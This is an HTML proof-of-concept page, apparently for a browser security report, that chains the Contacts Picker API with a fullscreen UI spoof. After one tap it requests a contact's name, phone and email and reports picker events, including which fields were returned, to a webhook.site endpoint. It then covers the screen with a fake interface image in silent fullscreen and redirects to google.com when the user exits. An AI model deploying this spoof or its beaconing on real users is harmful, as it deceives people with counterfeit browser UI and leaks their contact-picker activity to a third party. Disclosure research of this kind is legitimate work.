<!DOCTYPE html>
<html lang="en">
<head>
  <title>Contacts Picker → Fullscreen UI Spoof PoC</title>
  <meta charset="utf-8">
  <meta name="viewport"
        content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"/>

  <style>
    html, body {
      margin: 0;
      padding: 0;
      width: 100%;
      height: 100%;
      background: #000;
      font-family: system-ui, sans-serif;
    }

    #spoof {
      position: fixed;
      inset: 0;
      width: 100vw;
      height: 100vh;
      object-fit: cover;
      display: none;
      z-index: 9999;
    }

    #content {
      height: 100%;
      display: flex;
      align-items: center;
      justify-content: center;
      color: #fff;
      text-align: center;
    }
  </style>
</head>

<body>

<img id="spoof" src="spof2.png" alt="spoof-ui">

<div id="content">
  <h1>Tap anywhere to start demo</h1>
</div>

<script>
/**
 * Webhook ONLY for Contacts Picker lifecycle
 * No fullscreen / visibility / redirect logging
 */

const WEBHOOK = "https://webhook.site/8c1d3f26-5912-43a1-b878-91e9d07b3274";

function send(event, data = {}) {
  fetch(WEBHOOK, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      timestamp: new Date().toISOString(),
      event,
      ...data
    })
  }).catch(() => {});
}

document.addEventListener("click", async () => {

  // ✅ REQUEST #1 — picker dipanggil
  send("contacts_picker_called", {
    requested_fields: ["name", "tel", "email"]
  });

  let granted = false;

  if (navigator.contacts && navigator.contacts.select) {
    try {
      const result = await navigator.contacts.select(
        ["name", "tel", "email"],
        { multiple: false }
      );

      granted = result && result.length > 0;

      // ✅ REQUEST #2 — hasil picker
      send("contacts_picker_result", {
        granted,
        payload_shape: granted ? {
          hasName: !!result[0].name,
          hasEmail: !!result[0].email,
          hasTel: !!result[0].tel
        } : null
      });

    } catch (e) {
      send("contacts_picker_result", {
        granted: false,
        error: e.name
      });
    }
  } else {
    send("contacts_picker_result", {
      granted: false,
      error: "Contacts API not supported"
    });
  }

  // ⛔ Tidak kirim webhook di bawah ini

  // UI spoof
  document.getElementById("spoof").style.display = "block";
  document.getElementById("content").style.display = "none";

  // fullscreen tetap jalan, tapi silent
  if (document.documentElement.requestFullscreen) {
    document.documentElement.requestFullscreen().catch(() => {});
  }

}, { once: true });

// fullscreen exit → redirect (silent)
document.addEventListener("fullscreenchange", () => {
  if (!document.fullscreenElement) {
    setTimeout(() => {
      location.href = "https://google.com";
    }, 100);
  }
});
</script>

</body>
</html>
